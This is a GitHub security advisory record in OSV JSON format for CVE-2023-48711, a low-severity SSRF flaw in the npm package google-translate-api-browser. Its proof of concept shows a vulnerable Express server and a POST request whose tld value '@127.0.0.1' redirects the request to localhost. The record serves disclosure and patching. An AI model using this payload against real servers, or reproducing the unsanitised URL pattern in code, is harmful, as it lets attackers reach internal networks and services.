@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-4233-7q5q-m7p6",
+  "modified": "2023-11-27T23:30:14Z",
+  "published": "2023-11-27T23:30:14Z",
+  "aliases": [
+    "CVE-2023-48711"
+  ],
+  "summary": "google-translate-api-browser Server-Side Request Forgery (SSRF) Vulnerability",
+  "details": "### Summary\nA Server-Side Request Forgery (SSRF) Vulnerability is present in applications utilizing the `google-translate-api-browser` package and exposing the `translateOptions` to the end user. An attacker can set a malicious `tld`, causing the application to return unsafe URLs pointing towards local resources.\n\n### Details\nThe `translateOptions.tld` field is not properly sanitized before being placed in the Google translate URL. This can allow an attacker with control over the `translateOptions` to set the `tld` to a payload such as `@127.0.0.1`. This causes the full URL to become `https://translate.google.@127.0.0.1/...`, where `translate.google.` is the username used to connect to localhost.\n\n### PoC\nImagine a server running the following code (closely mimicking the code present in the package's README):\n```javascript\nconst express = require('express');\nconst { generateRequestUrl, normaliseResponse } = require('google-translate-api-browser');\nconst https = require('https');\n\nconst app = express();\napp.use(express.json());\n\napp.post('/translate', async (req, res) => {\n    const { text, options } = req.body;\n\n    const url = generateRequestUrl(text, options);\n\n    https.get(url, (resp) => {\n        let data = '';\n      \n        resp.on('data', (chunk) => {\n          data += chunk;\n        });\n      \n        resp.on('end', () => {\n            res.json(normaliseResponse(JSON.parse(data)));\n        });\n      }).on(\"error\", (err) => {\n        console.log(\"Error: \" + err.message);\n      });\n});\n\nconst port = 3000;\napp.listen(port, () => {\n  console.log(`Server is running on port ${port}`);\n});\n```\n\nAn attacker can then send the following POST request to `/translate`:\n```\nPOST /translate HTTP/1.1\nHost: localhost:3000\nContent-Type: application/json\nContent-Length: 51\n\n{\"text\":\"Hello\",\"options\": {\"tld\": \"@127.0.0.1\"}  }\n```\n\nThis will cause a request to be sent to the localhost of the server running the Node application.\n\n### Impact\nAn attacker can send requests within internal networks and the local host. Should any HTTPS application be present on the internal network with a vulnerability exploitable via a GET call, then it would be possible to exploit this using this vulnerability.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "google-translate-api-browser"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.1.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/cjvnjde/google-translate-api-browser/security/advisories/GHSA-4233-7q5q-m7p6"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-48711"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/cjvnjde/google-translate-api-browser/commit/33c2eac4a21c6504409e7b06dd16e6346f93d34b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/cjvnjde/google-translate-api-browser"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "severity": "LOW",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-11-27T23:30:14Z",
+    "nvd_published_at": "2023-11-24T17:15:07Z"
+  }
+}
